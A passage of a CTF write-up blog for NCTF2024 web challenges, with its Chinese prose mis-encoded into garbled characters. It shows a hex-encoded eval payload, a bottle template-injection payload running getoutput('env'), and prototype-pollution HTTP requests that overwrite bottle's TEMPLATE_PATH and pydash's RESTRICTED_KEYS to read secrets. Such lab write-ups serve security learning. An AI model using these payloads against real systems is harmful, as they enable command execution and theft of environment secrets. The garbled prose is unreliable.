æ­¤è¿™ç§å°±ä¸è¡Œå•¦ã€‚</p><p>æ—¢ç„¶æ˜¯æœ€æ–°ç‰ˆæœ¬ï¼Œæˆ‘ä»¬æœ¬åœ°ä¸‹ä¸€ä¸ªçœ‹çœ‹help</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324103838909.png" class="" title="This is an example image"><p>å‘ç°ä¸€ä¸ªevalå‚æ•°ï¼Œæ‰§è¡Œæä¾›çš„pythonä»£ç å¹¶åœ¨è¯·æ±‚ä¹‹å‰æ‰§è¡Œï¼Œæ‹¿ä¸‹äº†ã€‚</p><p>ç”±äºä»–æœ‰command.split()ï¼Œæˆ‘ä»¬ç”¨åå…­è¿›åˆ¶æ¥ç»•è¿‡ä¸€ä¸‹ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os; print(os.system(&#x27;env&#x27;))</span><br><span class="line">696d706f7274206f733b207072696e74286f732e73797374656d2827656e76272929</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123 --eval=exec(bytes.fromhex(&#x27;696d706f7274206f733b207072696e74286f732e73797374656d2827656e76272929&#x27;))</span><br></pre></td></tr></table></figure><img src="/2025/04/07/NCTF2024-web-wp/image-20250324104000162.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nctf&#123;e93d1ded-9f2a-4c79-8138-8564b43ca847&#125;</span><br></pre></td></tr></table></figure><h2 id="ez-dash"><a href="#ez-dash" class="headerlink" title="ez_dash"></a>ez_dash</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flagåœ¨ç¯å¢ƒå˜é‡ä¸­</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;func&quot;</span>,<span class="string">&quot;render&quot;</span>,</span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.find(<span class="string">&quot;&#123;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;&#125;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;.&quot;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>ä¸€é“bottleæ¡†æ¶çš„pythoné¢˜ï¼Œè€ƒç‚¹æ˜¯pythonåŸå‹é“¾æ±¡æŸ“ï¼‹ssti</p><p>ç¬¬ä¸€çœ¼çš„æ€è·¯å°±æ˜¯å…ˆé€šè¿‡åŸå‹é“¾æ±¡æŸ“æ±¡æŸ“æ¨¡æ¿æ ‡è¯†ç¬¦ï¼Œç„¶åç›´æ¥sstiï¼Œä½†æ˜¯æ­¤å¤„å®ƒå­˜åœ¨len(path)&gt;32ï¼Œä¸”nameä¸èƒ½ä¸ºbottle</p><p>æœ€åˆæƒ³æ³•ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=bottle HTTP/1.1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;path&quot;: &quot;BaseTemplate.settings&quot;,</span><br><span class="line">  &quot;value&quot;: &#123;</span><br><span class="line">    &quot;template_open&quot;: &quot;&lt;&lt;&quot;,</span><br><span class="line">    &quot;template_close&quot;: &quot;&gt;&gt;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ä¸Šè¿°è¿™ä¸ªä¸è¡Œï¼Œæ—¢ç„¶bottleä¸èƒ½ç”¨çœ‹ï¼Œé‚£æƒ³æƒ³globalsé‡Œé¢åˆæœ‰ä»€ä¹ˆå¯ä»¥ç”¨çš„ï¼Œè¿˜ä¸èƒ½æœ‰ä¸‹åˆ’çº¿ï¼Œåæ¥åˆæƒ³åˆ°äº†setvelè¿™ä¸ªå‡½æ•°ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=setval HTTP/1.1</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  &quot;path&quot;: &quot;__globals__[&#x27;bottle&#x27;].BaseTemplate.settings&quot;,</span><br><span class="line">  &quot;value&quot;: &#123;</span><br><span class="line">    &quot;template_open&quot;: &quot;&lt;&lt;&quot;,</span><br><span class="line">    &quot;template_close&quot;: &quot;&gt;&gt;&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯æ­¤å¤„ï¼Œpathçš„é•¿åº¦åˆè¶…æ ‡äº†ã€‚</p><p>ç„¶åå½“æˆ‘é˜…è¯»å®˜æ–¹æ–‡æ¡£çš„æ—¶å€™ï¼Œå‘ç°äº†ä¸€ç§å¥‡ç‰¹çš„æ¨¡æ¿æ¸²æŸ“</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324110335117.png" class="" title="This is an example image"><p>å¥½åƒä¸æ­¢<code>&#123;&#123;&#125;&#125;</code>å¯ä»¥æ¸²æŸ“æ¨¡æ¿ï¼Ÿï¼Ÿ<code>&lt;%%&gt;</code>å’Œ<code>%</code>å¥½åƒä¹Ÿå¯ä»¥ï¼Ÿï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if path.find(&quot;&#123;&quot;)&gt;=0 or path.find(&quot;&#125;&quot;)&gt;=0 or path.find(&quot;.&quot;)&gt;=0:</span><br></pre></td></tr></table></figure><p>åŒæ—¶æˆ‘ä»¬å‘ç°æ­¤å¤„çš„sstiæ²¡æœ‰é•¿åº¦é™åˆ¶ç­‰ï¼Œåªé™åˆ¶äº†è¿™ä¸‰ä¸ªï¼Œé‚£ä¹ˆæœºä¼šæ¥äº†ã€‚</p><p>å°è¯•æ„é€ payloadï¼Œè¯»å–ç¯å¢ƒå˜é‡ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%%20from%20bottle%20import%20abort%0a%20from%20subprocess%20import%20getoutput%0a%20a=getoutput(&#x27;env&#x27;)%0a%20abort(404,a)%&gt;</span><br></pre></td></tr></table></figure><p>é€šè¿‡abortæŠ¥é”™å¼¹å‡ºaå˜é‡çš„å€¼ã€‚</p><p><code>getoutput</code> æ˜¯ Python çš„ <code>subprocess</code> æ¨¡å—ä¸­çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºæ‰§è¡Œå‘½ä»¤å¹¶è¿”å›å…¶è¾“å‡ºã€‚å®ƒæ˜¯å¯¹ <code>os.popen</code> çš„å°è£…ï¼Œä½¿ç”¨èµ·æ¥æ›´åŠ ç®€æ´ã€‚å¦‚æœä½ éœ€è¦ç»•è¿‡ç‚¹å·ï¼ˆ<code>.</code>ï¼‰çš„é™åˆ¶æ¥æ‰§è¡Œå‘½ä»¤å¹¶è·å–è¾“å‡ºï¼Œ<code>getoutput</code> æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„é€‰æ‹©ã€‚</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324144504464.png" class="" title="This is an example image"><h2 id="ez-dash-revenge"><a href="#ez-dash-revenge" class="headerlink" title="ez_dash_revenge"></a>ez_dash_revenge</h2><p>ä¿®å¤ez_dashéé¢„æœŸ</p><p>ä¸Šé¢ç¡®å®æ˜¯éé¢„æœŸäº†ï¼Œæ¯•ç«ŸåŸå‹é“¾æ±¡æŸ“éƒ½æ²¡æœ‰ç”¨åˆ°ã€‚ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flagåœ¨ç¯å¢ƒå˜é‡ä¸­</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;render&quot;</span></span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    blacklist=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>åŸæœ¬æˆ‘ä»¬çš„æƒ³æ³•æ˜¯è¿™æ ·çš„ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=setval HTTP/<span class="number">1.1</span></span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;path&quot;</span>: <span class="string">&quot;__globals__[&#x27;bottle&#x27;].BaseTemplate.settings&quot;</span>,</span><br><span class="line">  <span class="string">&quot;value&quot;</span>: &#123;</span><br><span class="line">    <span class="string">&quot;template_open&quot;</span>: <span class="string">&quot;&lt;&lt;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;template_close&quot;</span>: <span class="string">&quot;&gt;&gt;&quot;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯ç°åœ¨sstiå¤„<code>&lt;&lt;&gt;&gt;</code>ä¹Ÿè¢«banäº†ã€‚é‚£ä¹ˆæ±¡æŸ“çš„è‚¯å®šå°±ä¸æ˜¯BaseTemplate.settingsäº†ã€‚</p><p>æˆ‘ä»¬çœ‹çœ‹å®˜æ–¹æ–‡æ¡£ï¼Œæ‰¾ä¸åˆ°ä»€ä¹ˆä¸œè¥¿äº†ï¼Œçœ‹çœ‹æºç å¥½äº†</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324153035112.png" class="" title="This is an example image"><p>å‘ç°å‡ ä¸ªå±æ€§ï¼Œé—®é—®ai</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324153104189.png" class="" title="This is an example image"><img src="/2025/04/07/NCTF2024-web-wp/image-20250324153124789.png" class="" title="This is an example image"><p>å¯ä»¥è®¾ç½®æ¨¡æ¿æ–‡ä»¶çš„æœç´¢è·¯å¾„ï¼Ÿï¼æœ‰ç‚¹ç±»ä¼¼äºpythonåŸå‹é“¾æ±¡æŸ“Flaskä¸­çš„_static_url_pathï¼Œæ”¹å˜é™æ€æ–‡ä»¶è·¯å¾„ã€‚</p><p>é‚£ä¹ˆå¦‚æœå°†TEMPLATE_PATHæ±¡æŸ“æˆ&#x2F;proc&#x2F;self&#x2F;ï¼Œé‚£ä¹ˆè®¿é—®&#x2F;renderè·¯ç”±æ—¶ï¼Œbottleä¼šåœ¨&#x2F;proc&#x2F;self&#x2F;ç§æŸ¥æ‰¾pathè¿›è¡Œæ¸²æŸ“ï¼Ÿï¼</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324153718275.png" class="" title="This is an example image"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=setval HTTP/1.1</span><br><span class="line">Host: 39.106.16.204:16613</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">&#123;&quot;path&quot;:&quot;__globals__.bottle.TEMPLATE_PATH&quot;,&quot;value&quot;:[&#x27;./&#x27;, &#x27;./views/&#x27;,&#x27;/proc/self/&#x27;]&#125;</span><br></pre></td></tr></table></figure><img src="/2025/04/07/NCTF2024-web-wp/image-20250324154432128.png" class="" title="This is an example image"><p>ä½†æ˜¯è¿™é‡Œå›æ˜¾noï¼Œçœ‹ä¸€ä¸‹æºç ï¼Œå‘ç°é•¿åº¦é™åˆ¶éƒ½æ˜¯æˆåŠŸç»•è¿‡çš„ï¼Œå”¯ä¸€çš„å¯èƒ½å°±æ˜¯setvalçš„æ—¶å€™æ²¡æœ‰æ±¡æŸ“æˆåŠŸï¼Œè¿™åˆæ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿ</p><p>è¿™é‡Œé—®äº†å¾ˆä¹…çš„ai</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324162534787.png" class="" title="This is an example image"><p>ç„¶åæˆ‘ä»¬åœ¨pydashçš„helpersä¸­å‘ç°äº†ï¼</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324162641516.png" class="" title="This is an example image"><img src="/2025/04/07/NCTF2024-web-wp/image-20250324162659714.png" class="" title="This is an example image"><p>é‚£ä¹ˆæˆ‘ä»¬ä¹Ÿè¦è®²pydash helpersä¸­çš„RESTRICTED_KEYSæ±¡æŸ“æ‰ï¼Œæ±¡æŸ“æˆä»€ä¹ˆéƒ½å¯ä»¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /setValue?name=pydash HTTP/1.1</span><br><span class="line">Host: 39.106.16.204:16613</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">&#123;&quot;path&quot;:&quot;helpers.RESTRICTED_KEYS&quot;,&quot;value&quot;:&quot;MeteorKai&quot;&#125;</span><br></pre></td></tr></table></figure><p>æ¥ä¸‹æ¥ä¾æ¬¡å‘åŒ…ï¼</p><img src="/2025/04/07/NCTF2024-web-wp/image-20250324163026696.png" class="" title="This is an example image"><img 